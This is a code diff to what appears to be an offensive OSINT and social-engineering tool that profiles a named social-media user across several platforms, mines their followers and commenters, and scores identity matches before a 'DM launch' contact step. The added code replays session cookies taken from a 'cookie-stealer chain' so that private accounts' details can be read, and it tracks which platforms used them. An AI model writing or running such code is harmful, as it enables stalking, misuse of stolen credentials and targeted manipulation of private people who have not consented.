@@ -110,6 +110,7 @@ class ReconResult:
     posts: str = ""
     avatar_url: str = ""
     avatar_hash: str = ""
+    avatar_dhash: str = ""       # perceptual hash: survives re-encoding
     emails: List[str] = field(default_factory=list)   # visible in bio/page
     leads: List[Lead] = field(default_factory=list)
 
@@ -131,6 +132,12 @@ class ReconResult:
                 f"PROFILE: username={self.username} platform={self.platform} "
                 f"private={int(self.state == 'private')} "
                 f"bio={self.bio.replace(' ', '_')} link={self.link}")
+        if self.avatar_url:
+            # operator-display surface: avatar + counts travel with the
+            # profile so a human (or the confirm gate) can eyeball it
+            out.append(
+                f"AVATAR: username={self.username} platform={self.platform} "
+                f"url={self.avatar_url}")
         for l in self.leads:
             if l.kind == "identity":
                 out.append(f"IDENTITY: email={l.value} source={l.evidence}")
@@ -154,16 +161,86 @@ class ReconResult:
 
 # ── helpers ──────────────────────────────────────────────────────────────────
 
-def _fetch(url: str, timeout: float = 15.0, ua: str = "") -> str:
-    """Bounded curl GET returning the body (never raises)."""
+def _fetch(url: str, timeout: float = 15.0, ua: str = "",
+           cookies: str = "") -> str:
+    """Bounded curl GET returning the body (never raises).
+
+    `cookies`: a pre-built `Cookie:` header value for THIS host (from
+    the operator's own stolen-cookie jar). Read-only views only — the
+    delivery paths never receive cookies (separate code, no parameter).
+    Values are sanitized to header-safe characters; anything exotic is
+    dropped rather than quoted.
+    """
     try:
         from phantom.core.executor import execute_quiet
         agent = ua or random.choice(_UAS)
+        header = ""
+        if cookies:
+            safe = re.sub(r"[^A-Za-z0-9._~+/%=&*\-; ]", "", str(cookies))[:4000]
+            if safe.strip():
+                header = f" -H 'Cookie: {safe.strip()}'"
         res = execute_quiet(
-            f"curl -s -L -m {int(timeout)} -A '{agent}' '{url}'", timeout=timeout + 10)
+            f"curl -s -L -m {int(timeout)} -A '{agent}'{header} '{url}'",
+            timeout=timeout + 10)
         return (res.stdout or "")[:400000]
     except Exception:
         return ""
+
+
+def _jar_for(url: str, jar: Dict[str, str]) -> str:
+    """Pick the Cookie header for a URL from {domain-suffix: header}.
+    Longest suffix wins (login.company.com beats company.com)."""
+    try:
+        from urllib.parse import urlsplit
+        host = (urlsplit(url).hostname or "").lower()
+    except ValueError:
+        return ""
+    if not host or not jar:
+        return ""
+    best, best_len = "", -1
+    for suffix, header in (jar or {}).items():
+        sfx = str(suffix or "").lower().lstrip(".")
+        if sfx and (host == sfx or host.endswith("." + sfx)):
+            if len(sfx) > best_len:
+                best, best_len = str(header or ""), len(sfx)
+    return best
+
+
+def session_jar(wm) -> Dict[str, str]:
+    """Build the operator-session jar from WorldModel stolen_cookies
+    findings: {domain-suffix: 'n=v; n2=v2'}.
+
+    Source of truth is the cookie-stealer chain (beacon on the
+    operator's own work box, CDP harvest, manual import): the operator
+    uses THEIR work account, and Phantom replays ONLY what the browser
+    would send to that same host. Values never leave this process
+    except inside the Cookie header itself.
+    """
+    jar: Dict[str, str] = {}
+    try:
+        findings = wm.find("stolen_cookies") if wm is not None else []
+    except Exception:
+        return jar
+    for f in findings or []:
+        v = getattr(f, "value", None)
+        entries = v.get("cookies", []) if isinstance(v, dict) else []
+        buckets: Dict[str, List[str]] = {}
+        for c in entries:
+            if not isinstance(c, dict):
+                continue
+            host = str(c.get("host", "") or "").lower().lstrip(".")
+            name = str(c.get("name", "") or "")
+            value = str(c.get("value", "") or "")
+            if not host or not name or not value:
+                continue
+            if not re.fullmatch(r"[A-Za-z0-9._~+/%=&*\-]+", name):
+                continue
+            if not re.fullmatch(r"[A-Za-z0-9._~+/%=&*\-]+", value):
+                continue
+            buckets.setdefault(host, []).append(f"{name}={value}")
+        for host, pairs in buckets.items():
+            jar[host] = "; ".join(pairs)[:4000]
+    return jar
 
 
 def _extract_json_blobs(html: str) -> List[dict]:
@@ -214,16 +291,21 @@ def _walk(obj, key: str, out: List, depth: int = 0):
 
 # ── layer 1: reliable state ──────────────────────────────────────────────────
 
-def _state_vote(username: str, platform: str) -> Tuple[str, float, str]:
+def _state_vote(username: str, platform: str, jar=None) -> Tuple[str, float, str]:
     """Two fetches with different UAs + short human delay; vote decides.
-    Returns (state, confidence, html_of_best)."""
+    Returns (state, confidence, html_of_best). `jar` (from session_jar)
+    attaches the operator's own session cookies to profile views so
+    authed-visible fields (bio/counts of a private account) resolve;
+    public infrastructure (archives, search) never gets cookies."""
     url = _PROFILE_URLS.get(platform, "").format(u=username)
     if not url:
         return "unknown", 0.0, ""
     votes: List[str] = []          # public | private | missing
     best_html = ""
+    cookies = _jar_for(url, jar or {})
     for i in range(2):
-        html = _fetch(url, timeout=15.0, ua=_UAS[i % len(_UAS)])
+        html = _fetch(url, timeout=15.0, ua=_UAS[i % len(_UAS)],
+                      cookies=cookies)
         if not html:
             votes.append("missing")
             continue
@@ -249,7 +331,7 @@ def _state_vote(username: str, platform: str) -> Tuple[str, float, str]:
 # ── layer 2: graph mining ────────────────────────────────────────────────────
 
 def _mine_graph(username: str, platform: str, html: str,
-                result: ReconResult) -> None:
+                result: ReconResult, jar=None) -> None:
     """Tagged/commenter/follower mining from embedded JSON + page regex."""
     ev = f"graph:{platform}"
     blobs = _extract_json_blobs(html) if html else []
@@ -295,9 +377,16 @@ def _mine_graph(username: str, platform: str, html: str,
             imgs.append(m.group(1))
     if imgs and isinstance(imgs[0], str):
         result.avatar_url = imgs[0][:300]
-        raw = _fetch(imgs[0], timeout=10.0)
+        raw = _fetch(imgs[0], timeout=10.0,
+                     cookies=_jar_for(imgs[0], jar or {}))
         if raw:
             result.avatar_hash = hashlib.md5(raw[:100000]).hexdigest()[:16]
+            try:
+                from phantom.automation.social.identity_confidence import (
+                    compute_dhash)
+                result.avatar_dhash = compute_dhash(raw)
+            except Exception:
+                result.avatar_dhash = ""
     # emails visible in the profile's OWN bio/page (identity-confidence
     # anchors: same email on two platforms is CONFIRMED-grade proof)
     if html:
@@ -469,37 +558,135 @@ def correlate_accounts(results: List[ReconResult]) -> List[Lead]:
     return leads
 
 
+# ── ambiguity: operator disambiguation ───────────────────────────────────────
+
+# Two PROBABLE+ candidates close together below CONFIRMED: the engine
+# cannot tell them apart, and guessing contacts the wrong person. The
+# safe default (no ask hook) widens once, then halts without contact.
+# With an ask hook (interactive shell / API answer), the operator sees
+# avatar+bio+links and decides: same:<handle> | stop | widen.
+_AMBIGUITY_BAND = 0.15
+
+
+def _resolve_ambiguity(scored, ask) -> List[str]:
+    """scored: [(handle, platform, tier, score, evidence, result)]."""
+    from phantom.automation.social.identity_confidence import (
+        CONFIRMED, PROBABLE)
+    contenders = sorted(
+        [(h, p, t, s, e, r) for h, p, t, s, e, r in scored
+         if t in (CONFIRMED, PROBABLE)],
+        key=lambda x: x[3], reverse=True)
+    if len(contenders) < 2:
+        return []
+    (h1, p1, t1, s1, e1, r1), (h2, p2, t2, s2, e2, r2) = contenders[:2]
+    if t1 == CONFIRMED or (s1 - s2) > _AMBIGUITY_BAND:
+        return []  # clear winner: no question to ask
+    desc = (f"{h1}@{p1} ({t1} {s1:.2f}) vs {h2}@{p2} ({t2} {s2:.2f})")
+    if ask is None:
+        return [f"IDENTITY_AMBIGUOUS: candidates={h1}@{p1},{h2}@{p2} "
+                f"decision=widen_once_then_halt evidence={desc.replace(' ', '_')}"]
+    try:
+        decision = (ask(desc, [(h1, p1, r1), (h2, p2, r2)]) or "").strip()
+    except Exception:
+        decision = ""
+    if decision.startswith("same:"):
+        winner = decision.split("same:", 1)[1].strip().lstrip("@").lower()
+        return [f"IDENTITY_RESOLVED: winner={winner} by=operator "
+                f"evidence={desc.replace(' ', '_')}"]
+    if decision == "stop":
+        return ["IDENTITY_RESOLVED: winner=none by=operator_stop "
+                f"evidence={desc.replace(' ', '_')}"]
+    return [f"IDENTITY_AMBIGUOUS: candidates={h1}@{p1},{h2}@{p2} "
+            f"decision=widen evidence={desc.replace(' ', '_')}"]
+
+
+# ── operator confirmation surface ────────────────────────────────────────────
+
+def preview_profile(username: str, platform: str,
+                    jar=None) -> ReconResult:
+    """One bounded look at a profile (2 fetches max): state vote + bio +
+    counts + avatar, no variants/search/wayback. Powers the start-gate
+    ("is this him?") in CLI/API/UI BEFORE a run commits to a target."""
+    username = (username or "").strip().lstrip("@")
+    platform = (platform or "instagram").lower()
+    result = ReconResult(username=username, platform=platform)
+    if not username:
+        return result
+    state, conf, html = _state_vote(username, platform, jar)
+    result.state, result.state_confidence = state, conf
+    if html:
+        result.bio = _extract_bio(html)
+        result.link = _extract_link(result.bio)
+        _mine_graph(username, platform, html, result, jar)
+    return result
+
+
+def present_candidate(result: "ReconResult") -> str:
+    """One-screen operator summary of a candidate profile: avatar URL
+    (the UI renders the image), bio, follower/following/posts counts,
+    link and state. Used by the start-gate ("is this him?") and by the
+    mid-run disambiguation ("which one?"). Pure rendering, no I/O."""
+    lines = [f"@{result.username} ({result.platform}) — {result.state}"]
+    if result.full_name:
+        lines.append(f"  name: {result.full_name}")
+    if result.bio:
+        lines.append(f"  bio: {result.bio[:220]}")
+    counts = " / ".join(
+        f"{k}: {v}" for k, v in
+        (("followers", result.followers), ("following", result.following),
+         ("posts", result.posts)) if v)
+    if counts:
+        lines.append(f"  {counts}")
+    if result.link:
+        lines.append(f"  link: {result.link}")
+    if result.avatar_url:
+        lines.append(f"  avatar: {result.avatar_url}")
+    return "\n".join(lines)
+
+
 # ── engine entry point ───────────────────────────────────────────────────────
 
 def deep_recon(username: str, platform: str = "",
                variants: bool = True, wayback: bool = True,
-               search: bool = True) -> Tuple[bool, List[str]]:
+               search: bool = True, ask=None, jar=None) -> Tuple[bool, List[str]]:
     """Full reverse-engineering pass. Returns marker lines for the social
-    interpreter. Bounded: <= 20 network calls total, never raises."""
+    interpreter. Bounded: <= 20 network calls total, never raises.
+
+    `ask`: optional operator hook for ambiguity
+    (ask(description, [(handle, platform, result), ...]) -> "same:<handle>"
+    | "stop" | "widen" | ""). None = safe default (widen once, halt
+    without contact).
+
+    `jar`: operator-session cookies ({domain-suffix: header}) from the
+    stealer chain. Attached ONLY to platform profile views (never to
+    archives/search), so an authed-visible bio/counts resolves on
+    private accounts. Which hosts used it is emitted as SESSION_USED.
+    """
     try:
         lines: List[str] = []
         username = (username or "").strip().lstrip("@")
         if not username:
             return False, ["ERROR: deep_recon needs a username"]
         platform = (platform or "instagram").lower()
+        jar = jar or {}
 
         results: List[ReconResult] = []
 
         # primary platform: state vote + graph mining
-        state, conf, html = _state_vote(username, platform)
+        state, conf, html = _state_vote(username, platform, jar)
         primary = ReconResult(username=username, platform=platform,
                               state=state, state_confidence=conf)
         if html:
             primary.bio = _extract_bio(html)
             primary.link = _extract_link(primary.bio)
-            _mine_graph(username, platform, html, primary)
+            _mine_graph(username, platform, html, primary, jar)
         results.append(primary)
 
         # same handle on OTHER platforms (single quick fetch each)
         for p in ("instagram", "tiktok", "x", "github", "telegram"):
             if p == platform:
                 continue
-            st, cf, h2 = _state_vote(username, p)
+            st, cf, h2 = _state_vote(username, p, jar)
             if st == "missing":
                 continue
             r = ReconResult(username=username, platform=p, state=st,
@@ -507,7 +694,7 @@ def deep_recon(username: str, platform: str = "",
             if h2:
                 r.bio = _extract_bio(h2)
                 r.link = _extract_link(r.bio)
-                _mine_graph(username, p, h2, r)
+                _mine_graph(username, p, h2, r, jar)
                 if r.state == "public" and r.bio:
                     # a PUBLIC account of the same handle on another platform
                     primary.leads.append(Lead(
@@ -517,13 +704,13 @@ def deep_recon(username: str, platform: str = "",
         # username variants (bounded sherlock-style probe)
         if variants:
             for v in _username_variants(username):
-                st, cf, h2 = _state_vote(v, platform)
+                st, cf, h2 = _state_vote(v, platform, jar)
                 if st == "public" and cf >= 0.5:
                     rv = ReconResult(username=v, platform=platform,
                                      state=st, state_confidence=cf)
                     if h2:
                         rv.bio = _extract_bio(h2)
-                        _mine_graph(v, platform, h2, rv)
+                        _mine_graph(v, platform, h2, rv, jar)
                     results.append(rv)
                     primary.leads.append(Lead(
                         "account_link", v, platform, "variant_probe", 0.55))
@@ -542,12 +729,17 @@ def deep_recon(username: str, platform: str = "",
         for lead in correlate_accounts(results):
             if lead not in primary.leads:
                 primary.leads.append(lead)
-
         # identity confidence: every cross-platform candidate is SCORED
         # against the primary identity so the chain never contacts the
         # wrong person (username collision is the trap this closes).
+        # `ask`, when provided, resolves AMBIGUITY live: 2+ candidates
+        # close together below CONFIRMED pause for one operator decision
+        # (same <handle> | stop | widen), otherwise the safe default
+        # applies (widen once, then halt without contact).
         from phantom.automation.social.identity_confidence import (
             score_lead as _score, may_act as _may_act)
+        from phantom.automation.social.identity_confidence import CONFIRMED as _CONFIRMED
+
         def _graph_of(r: ReconResult) -> List[str]:
             """The social circle of a profile: commenters + tagged handles
             + discovered account links (the same strangers who interact
@@ -556,25 +748,41 @@ def deep_recon(username: str, platform: str = "",
                    if l.kind in ("commenter", "tagged", "account_link")]
             return sorted({h.lstrip("@").lower() for h in out if h})[:40]
 
+        def _outbound_of(r: ReconResult) -> List[str]:
+            """Handles the primary page itself points at (bio links,
+            discovered account links): the other half of a bidirectional
+            cross-link check."""
+            out = [l.value for l in r.leads if l.kind == "account_link"]
+            if r.link:
+                out.append(r.link)
+            return sorted({str(h).lstrip("@").lower() for h in out if h})[:20]
+
         primary_dict = {
             "username": primary.username, "bio": primary.bio,
-            "avatar_hash": primary.avatar_hash, "link": primary.link,
+            "avatar_hash": primary.avatar_hash,
+            "avatar_dhash": primary.avatar_dhash, "link": primary.link,
+            "outbound": _outbound_of(primary),
             "full_name": primary.full_name,
             "emails": sorted({*(l.value for l in primary.leads
-                                if l.kind == "identity" and "@" in l.value),
-                              *primary.emails}),
+                                 if l.kind == "identity" and "@" in l.value),
+                               *primary.emails}),
             "graph": _graph_of(primary),
         }
+        scored = []  # (handle, platform, tier, score, evidence)
         for r in results[1:]:
             if r.platform == primary.platform:
                 continue
             lead_obj = _score(primary_platform, primary_dict, {
                 "username": r.username, "bio": r.bio,
-                "avatar_hash": r.avatar_hash, "link": r.link,
+                "avatar_hash": r.avatar_hash,
+                "avatar_dhash": r.avatar_dhash, "link": r.link,
+                "full_name": r.full_name,
                 "emails": r.emails,
                 "graph": _graph_of(r),
             })
             tier = lead_obj.tier
+            scored.append((r.username, r.platform, tier, lead_obj.score,
+                           lead_obj.evidence, r))
             # policy snapshot for the marker: contact needs CONFIRMED
             # (or --aggressive); read-only recon is always allowed.
             dm_ok, why = _may_act(lead_obj, "dm_launch", aggressive=False)
@@ -582,6 +790,28 @@ def deep_recon(username: str, platform: str = "",
                 f"IDENTITY_CONF: handle={r.username} platform={r.platform} "
                 f"tier={tier} score={lead_obj.score:.2f} "
                 f"contact={int(bool(dm_ok))} why={why.replace(' ', '_')}")
+        if ask is not None:
+            lines.extend(_resolve_ambiguity(scored, ask))
+        if jar:
+            # operator-session receipt: WHICH platform views went out
+            # with the operator's own cookies (read-only views only —
+            # archives/search never receive them). Counts and platforms
+            # only: values never enter a marker.
+            try:
+                from urllib.parse import urlsplit
+                used = set()
+                for r in results:
+                    probe = _PROFILE_URLS.get(r.platform, "").format(
+                        u=r.username or "x")
+                    host = (urlsplit(probe).hostname or "").lower()
+                    if host and _jar_for(f"https://{host}/", jar):
+                        used.add(r.platform)
+                if used:
+                    lines.append(
+                        f"SESSION_USED: platforms={','.join(sorted(used))} "
+                        f"source=operator_session readonly=1")
+            except Exception:
+                pass
         for lead in primary.leads:
             if lead.kind in ("account_link", "search_hit", "wayback"):
                 lines.append(f"ACCOUNT_LINK: handle={lead.value} "
